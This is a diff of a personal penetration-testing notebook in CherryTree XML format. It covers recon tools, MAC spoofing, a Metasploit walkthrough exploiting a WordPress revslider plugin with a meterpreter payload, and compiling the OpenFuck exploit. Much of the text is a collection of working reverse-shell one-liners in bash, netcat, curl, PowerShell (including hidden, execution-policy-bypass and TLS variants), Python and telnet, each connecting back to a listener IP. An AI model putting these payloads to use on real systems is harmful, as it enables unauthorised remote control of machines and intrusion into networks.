+        <rich_text scale="h1" weight="heavy">More Penetration Commands</rich_text>
+        <rich_text> (Most Used)</rich_text>
+        <node name="arachni" unique_id="241" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684530690" ts_lastsave="1694326232">
+          <rich_text>Download Page:
+</rich_text>
+          <rich_text link="webs https://www.arachni-scanner.com/download/">https://www.arachni-scanner.com/download/</rich_text>
+          <rich_text>
+
+Linux Download link:
+</rich_text>
+          <rich_text link="webs https://objects.githubusercontent.com/github-production-release-asset-2e65be/861781/858de0ed-8b61-4bf0-a354-fa40fa590006?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20230519%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20230519T205347Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=ca5d22a8a5f560edbe65936446e078369b0ab29e9a49d7970bead40ad33e1dc5&amp;X-Amz-SignedHeaders=host&amp;actor_id=0&amp;key_id=0&amp;repo_id=861781&amp;response-content-disposition=attachment%3B%20filename%3Darachni-1.6.1.3-0.6.1.1-linux-x86_64.tar.gz&amp;response-content-type=application%2Foctet-stream">https://objects.githubusercontent.com/github-production-release-asset-2e65be/861781/858de0ed-8b61-4bf0-a354-fa40fa590006?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20230519%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20230519T205347Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=ca5d22a8a5f560edbe65936446e078369b0ab29e9a49d7970bead40ad33e1dc5&amp;X-Amz-SignedHeaders=host&amp;actor_id=0&amp;key_id=0&amp;repo_id=861781&amp;response-content-disposition=attachment%3B%20filename%3Darachni-1.6.1.3-0.6.1.1-linux-x86_64.tar.gz&amp;response-content-type=application%2Foctet-stream</rich_text>
+        </node>
+        <node name="arp" unique_id="172" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285702" ts_lastsave="1694147890">
+          <rich_text>Usage:
+  arp [-vn]  [&lt;HW&gt;] [-i &lt;if&gt;] [-a] [&lt;hostname&gt;]             &lt;-Display ARP cache
+  arp [-v]          [-i &lt;if&gt;] -d  &lt;host&gt; [pub]               &lt;-Delete ARP entry
+  arp [-vnD] [&lt;HW&gt;] [-i &lt;if&gt;] -f  [&lt;filename&gt;]            &lt;-Add entry from file
+  arp [-v]   [&lt;HW&gt;] [-i &lt;if&gt;] -s  &lt;host&gt; &lt;hwaddr&gt; [temp]            &lt;-Add entry
+  arp [-v]   [&lt;HW&gt;] [-i &lt;if&gt;] -Ds &lt;host&gt; &lt;if&gt; [netmask &lt;nm&gt;] pub          &lt;-''-
+
+        -a                       display (all) hosts in alternative (BSD) style
+        -e                       display (all) hosts in default (Linux) style
+
+        -s, --set                set a new ARP entry
+        -d, --delete             delete a specified entry
+
+        -v, --verbose            be verbose
+
+        -n, --numeric            don't resolve names
+        -i, --device             specify network interface (e.g. eth0)
+        -D, --use-device         read &lt;hwaddr&gt; from given device
+        -A, -p, --protocol       specify protocol family
+        -f, --file               read new entries from file or from /etc/ethers
+
+
+
+
+Ex:
+$ arp -va
+$ arp -ve
+$ arp -vn
+$ arp -v -i &lt;&lt;eth0&gt;&gt;</rich_text>
+        </node>
+        <node name="arp-scan" unique_id="171" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285689" ts_lastsave="1694326235"/>
+        <node name="dig" unique_id="203" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286089" ts_lastsave="1684286104"/>
+        <node name="dirb" unique_id="176" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285726" ts_lastsave="1684285731"/>
+        <node name="dirbuster" unique_id="177" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285731" ts_lastsave="1684285738"/>
+        <node name="dirsearch" unique_id="196" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285975" ts_lastsave="1684285975"/>
+        <node name="enum4linux" unique_id="183" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285785" ts_lastsave="1684285801"/>
+        <node name="fping" unique_id="211" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286205" ts_lastsave="1684286212"/>
+        <node name="gobuster" unique_id="178" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285738" ts_lastsave="1684285753"/>
+        <node name="hostname" unique_id="204" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286104" ts_lastsave="1684286514">
+          <rich_text>hostname
+hostnamectl</rich_text>
+        </node>
+        <node name="ifconfig" unique_id="191" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285877" ts_lastsave="1694323928">
+          <rich_text>ifconfig -a
+ifconfig wlan0 down; macchanger wlan0 -a; ifconfig wlan0 up;
+</rich_text>
+        </node>
+        <node name="ip" unique_id="192" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285885" ts_lastsave="1694595707">
+          <rich_text foreground="#18b2b2">ip</rich_text>
+          <rich_text> a .. address
+</rich_text>
+          <rich_text foreground="#18b2b2">ip</rich_text>
+          <rich_text> netconf
+</rich_text>
+          <rich_text foreground="#18b2b2">ip</rich_text>
+          <rich_text> link 
+</rich_text>
+          <rich_text foreground="#18b2b2">ip</rich_text>
+          <rich_text> addrlabel
+ 
+</rich_text>
+          <node name="info" unique_id="281" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694595660" ts_lastsave="1694595781">
+            <rich_text foreground="#5454ff" weight="heavy">$</rich_text>
+            <rich_text> </rich_text>
+            <rich_text foreground="#18b2b2">ip</rich_text>
+            <rich_text> </rich_text>
+            <rich_text foreground="#18b218">-h</rich_text>
+            <rich_text>
+Usage: ip [ OPTIONS ] OBJECT { COMMAND | help }
+       ip [ -force ] -batch filename
+
+where  OBJECT := { address | addrlabel | amt | fou | help | ila | ioam | l2tp |
+                   link | macsec | maddress | monitor | mptcp | mroute | mrule |
+                   neighbor | neighbour | netconf | netns | nexthop | ntable |
+                   ntbl | route | rule | sr | tap | tcpmetrics |
+                   token | tunnel | tuntap | vrf | xfrm }
+ 
+       OPTIONS := { -V[ersion] | -s[tatistics] | -d[etails] | -r[esolve] |
+                    -h[uman-readable] | -iec | -j[son] | -p[retty] |
+                    -f[amily] { inet | inet6 | mpls | bridge | link } |
+                    -4 | -6 | -M | -B | -0 |
+                    -l[oops] { maximum-addr-flush-attempts } | -br[ief] |
+                    -o[neline] | -t[imestamp] | -ts[hort] | -b[atch] [filename] |
+                    -rc[vbuf] [size] | -n[etns] name | -N[umeric] | -a[ll] |
+
+
+
+</rich_text>
+            <rich_text foreground="#5454ff" weight="heavy">$</rich_text>
+            <rich_text> </rich_text>
+            <rich_text foreground="#18b2b2">whatis</rich_text>
+            <rich_text> ip
+ip (7)               - Linux IPv4 protocol implementation 
+ip (8)               - show / manipulate routing, network devices, interfaces and tunnels
+ </rich_text>
+          </node>
+        </node>
+        <node name="macchanger" unique_id="199" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286013" ts_lastsave="1694324254">
+          <rich_text>macchanger -s eth0  # -s --show
+macchanger -a eth0  # another kind
+macchanger -r eth0  # fully random</rich_text>
+        </node>
+        <node name="msfconsole" unique_id="194" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285913" ts_lastsave="1685347989">
+          <rich_text>searchsploit &lt;ANYTHING&gt;
+
+search &lt;ANYTHING&gt;
+
+use &lt;X&gt;
+set &lt;X&gt;
+
+show options
+
+set rhost &lt;IP&gt;
+set rhosts &lt;IP&gt;
+
+setg rhost &lt;IP&gt;
+setg rhosts &lt;IP&gt;
+
+show payload
+set payload &lt;X&gt;
+
+
+Example:
+1. $ search revslider
+2. $ use exploit/unix/webapp/wp_revslider_upload_execute
+3. $ show options
+4. $ set rhost 127.0.0.1/targetsiteurl.com
+5. $ set targeturi /wordpress
+6. $ set payload php/meterpreter/bind_tcp
+7. $ show options
+8. $ check
+9. $ exploit (or -&gt; $ run)
+</rich_text>
+        </node>
+        <node name="nbtscan" unique_id="215" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286439" ts_lastsave="1694573845">
+          <rich_text>nbtscan 192.168.90.135/24
+</rich_text>
+        </node>
+        <node name="ncrack" unique_id="213" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286332" ts_lastsave="1684286332"/>
+        <node name="nessus" unique_id="181" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285772" ts_lastsave="1684285776"/>
+        <node name="netcat" unique_id="209" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286180" ts_lastsave="1686252765">
+          <rich_text>Host Machine:
+nc -lnv -s 192.168.90.129 -p 4444
+
+Target Box:
+bash -i &gt;&amp; /dev/tcp/192.168.56.1/4444 0&gt;&amp;1
+
+or use nc again
+nc 192.168.90.128 4444 -e /bin/bash</rich_text>
+        </node>
+        <node name="netdiscover" unique_id="179" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285753" ts_lastsave="1684285767"/>
+        <node name="netstat" unique_id="207" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286149" ts_lastsave="1684286166"/>
+        <node name="nikto" unique_id="175" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285721" ts_lastsave="1694326313">
+          <rich_text>nikto -h 192.168.31.1</rich_text>
+        </node>
+        <node name="nmap" unique_id="174" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285717" ts_lastsave="1696639005"/>
+        <node name="nmapsi4" unique_id="287" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696639005" ts_lastsave="1696639005"/>
+        <node name="nmcli" unique_id="184" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285801" ts_lastsave="1684285801"/>
+        <node name="nslookup" unique_id="208" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286166" ts_lastsave="1684286180"/>
+        <node name="owasp" unique_id="180" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285767" ts_lastsave="1684285772"/>
+        <node name="patator" unique_id="195" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285961" ts_lastsave="1684285975"/>
+        <node name="ping" unique_id="210" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286201" ts_lastsave="1684286205"/>
+        <node name="proxychains" unique_id="200" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286022" ts_lastsave="1684286027"/>
+        <node name="python" unique_id="243" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685336868" ts_lastsave="1728545859">
+          <rich_text>python -c ‘from time import time as t;print(t())’</rich_text>
+        </node>
+        <node name="route" unique_id="190" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285872" ts_lastsave="1684285877"/>
+        <node name="searchsploit" unique_id="193" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285904" ts_lastsave="1684287412">
+          <rich_text>searchsploit xxx
+searchsploit -p 0000
+gcc -o openfuck OpenFuck.c -lcrypto</rich_text>
+        </node>
+        <node name="smbclient" unique_id="227" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684287313" ts_lastsave="1684287313"/>
+        <node name="sqlmap" unique_id="240" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684529801" ts_lastsave="1684529801"/>
+        <node name="traceroute" unique_id="212" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286212" ts_lastsave="1684286212"/>
+        <node name="wapiti" unique_id="237" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684529739" ts_lastsave="1684529739"/>
+        <node name="whatweb" unique_id="352" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1725161979" ts_lastsave="1725161979"/>
+        <node name="whois" unique_id="201" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286071" ts_lastsave="1718594701"/>
+      </node>
     </node>
-    <node name="Spawn shell" unique_id="295" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="1718592943" ts_lastsave="1729650284">
+    <node name="Spawn shell" unique_id="295" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="1718592943" ts_lastsave="1730263102">
       <rich_text scale="h1" weight="heavy">Full TTY Spawning Shell</rich_text>
-      <rich_text>
-(Quick Guide)
+      <rich_text>(Quick Guide)
 
 # </rich_text>
       <rich_text foreground="#f6f661615151" weight="heavy">Tip</rich_text>
@@ -8432,18 +9071,16 @@ export SHELL=/bin/bash
 export SHELL=/bin/sh
 </rich_text>
       <rich_text>
-set $PATH:
+Set/Update $PATH:
 </rich_text>
       <rich_text family="monospace">PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/snap/bin:/snap/sbin</rich_text>
       <rich_text>
-
-Update $PATH:
 </rich_text>
       <rich_text family="monospace">PATH=$PAHT:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/snap/bin:/snap/sbin</rich_text>
       <rich_text>
 
 
-quick alias:
+Quick alias:
 </rich_text>
       <rich_text family="monospace">alias ls='ls --color'
 alias ll='ls -al --color'
@@ -8771,7 +9408,9 @@ W</rich_text>
         <rich_text>
 </rich_text>
         <rich_text link="webs https://github.com/0dayCTF/reverse-shell-generator">https://github.com/0dayCTF/reverse-shell-generator</rich_text>
-        <node name="sample" unique_id="357" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1725519471" ts_lastsave="1725521034">
+        <node name="sample" unique_id="357" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1725519471" ts_lastsave="1730275802">
+          <rich_text>
+</rich_text>
           <rich_text underline="single" scale="h1" weight="heavy">Reverse Shell Online</rich_text>
           <rich_text scale="h1" weight="heavy">: </rich_text>
           <rich_text scale="h1" foreground="#1c1c7171d8d8" weight="heavy">https://www.revshells.com/</rich_text>
@@ -8781,7 +9420,7 @@ W</rich_text>
 </rich_text>
           <rich_text scale="h1" weight="heavy">info</rich_text>
           <rich_text>
-192.168.100.28
+192.168.100.1
 9990
 
 
@@ -8791,7 +9430,7 @@ W</rich_text>
 • 		nc -lvnp 9990 
 • 		busybox nc -lp 9990
 • 		openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 30 -nodes; openssl s_server -quiet -key key.pem -cert cert.pem -port 9990
-• 		msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.100.28; set lport 9990; exploit"
+• 		msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.100.1; set lport 9990; exploit"
 
     
   
@@ -8800,38 +9439,38 @@ W</rich_text>
           <rich_text weight="heavy">
 Bash -i</rich_text>
           <rich_text>
-sh -i &gt;&amp; /dev/tcp/192.168.100.28/9990 0&gt;&amp;1
+sh -i &gt;&amp; /dev/tcp/192.168.100.1/9990 0&gt;&amp;1
 
 </rich_text>
           <rich_text weight="heavy">nc -e</rich_text>
           <rich_text>
-nc 192.168.100.28 9990 -e sh
-nc.exe 192.168.100.28 9990 -e sh
+nc 192.168.100.1 9990 -e sh
+nc.exe 192.168.100.1 9990 -e sh
 
 </rich_text>
           <rich_text weight="heavy">BusyBox nc -e</rich_text>
           <rich_text>
-busybox nc 192.168.100.28 9990 -e sh
+busybox nc 192.168.100.1 9990 -e sh
 
 </rich_text>
           <rich_text weight="heavy">curl</rich_text>
           <rich_text>
-C='curl -Ns telnet://192.168.100.28:9990'; $C &lt;/dev/null 2&gt;&amp;1 | sh 2&gt;&amp;1 | $C &gt;/dev/null/
+C='curl -Ns telnet://192.168.100.1:9990'; $C &lt;/dev/null 2&gt;&amp;1 | sh 2&gt;&amp;1 | $C &gt;/dev/null/
 
 </rich_text>
           <rich_text weight="heavy">powershell #1</rich_text>
           <rich_text>
-$LHOST = "192.168.100.28"; $LPORT = 9990; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2&gt;&amp;1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
+$LHOST = "192.168.100.1"; $LPORT = 9990; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2&gt;&amp;1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
 
 </rich_text>
           <rich_text weight="heavy">powershell #2</rich_text>
           <rich_text>
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.100.28',9990);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.100.1',9990);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 
 </rich_text>
           <rich_text weight="heavy">powershell #3</rich_text>
           <rich_text>
-powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('192.168.100.28', 9990);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL&gt; ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2&gt;&amp;1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
+powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('192.168.100.1', 9990);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL&gt; ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2&gt;&amp;1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
 
 </rich_text>
           <rich_text weight="heavy">powershell #3</rich_text>
@@ -8841,12 +9480,12 @@ powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdA
 </rich_text>
           <rich_text weight="heavy">powershell #4</rich_text>
           <rich_text>
-$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('192.168.100.28', 9990);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL&gt; ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2&gt;&amp;1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()
+$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('192.168.100.1', 9990);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL&gt; ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2&gt;&amp;1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()
 
 </rich_text>
           <rich_text weight="heavy">python</rich_text>
           <rich_text>
-export RHOST="192.168.100.28";export RPORT=9990;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+export RHOST="192.168.100.1";export RPORT=9990;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
 
 </rich_text>
           <rich_text weight="heavy">python windows</rich_text>
@@ -8864,7 +9503,7 @@ def p2s(s, p):
         s.send(p.stdout.read(1))
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("192.168.100.28",9990))
+s.connect(("192.168.100.1",9990))
 
 p=subprocess.Popen(["sh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
 
@@ -8884,23 +9523,27 @@ except KeyboardInterrupt:
 </rich_text>
           <rich_text weight="heavy">telnet</rich_text>
           <rich_text>
-TF=$(mktemp -u);mkfifo $TF &amp;&amp; telnet 192.168.100.28 9990 0&lt;$TF | sh 1&gt;$TF</rich_text>
+TF=$(mktemp -u);mkfifo $TF &amp;&amp; telnet 192.168.100.1 9990 0&lt;$TF | sh 1&gt;$TF</rich_text>
         </node>
       </node>
-      <node name="python" unique_id="385" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728545515" ts_lastsave="1730173048">
+      <node name="python" unique_id="385" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728545515" ts_lastsave="1730274905">
         <rich_text scale="h2" weight="heavy">Execute SHELL:</rich_text>
         <rich_text>
 </rich_text>
-        <rich_text foreground="#3333d1d17a7a">$ python -c 'import pty; pty.spawn("/bin/sh")'	</rich_text>
-        <rich_text>		</rich_text>
+        <rich_text foreground="#2626a2a26969">$ python</rich_text>
+        <rich_text foreground="#8f8ff0f0a4a4"> -c 'import pty; pty.spawn("/bin/sh")'		</rich_text>
+        <rich_text>	</rich_text>
         <rich_text foreground="#35358484e4e4" weight="heavy"># Type:1</rich_text>
         <rich_text> ***
 </rich_text>
-        <rich_text foreground="#3333d1d17a7a">$ python -c 'import pty; pty.spawn("/usr/bin/sh")'</rich_text>
+        <rich_text foreground="#2626a2a26969">$ python</rich_text>
+        <rich_text foreground="#8f8ff0f0a4a4"> -c 'import pty; pty.spawn("/usr/bin/sh")'</rich_text>
         <rich_text>
 -
 </rich_text>
-        <rich_text foreground="#3333d1d17a7a">$ python -c 'import os; os.system("/bin/sh")'	</rich_text>
+        <rich_text foreground="#2626a2a26969">$ python</rich_text>
+        <rich_text foreground="#8f8ff0f0a4a4"> -c 'import os; os.system("/bin/sh")'</rich_text>
+        <rich_text foreground="#3333d1d17a7a">	</rich_text>
         <rich_text>		</rich_text>
         <rich_text foreground="#35358484e4e4" weight="heavy"># Type:2</rich_text>
         <rich_text> *
@@ -8912,18 +9555,33 @@ TF=$(mktemp -u);mkfifo $TF &amp;&amp; telnet 192.168.100.28 9990 0&lt;$TF | sh 1
         <rich_text scale="h2" weight="heavy">:</rich_text>
         <rich_text>
 </rich_text>
-        <rich_text foreground="#3333d1d17a7a">$ python3 -c 'import os; os.system("nc &lt;ip&gt; &lt;port&gt; -e /bin/sh")'</rich_text>
+        <rich_text foreground="#2626a2a26969">$ python3</rich_text>
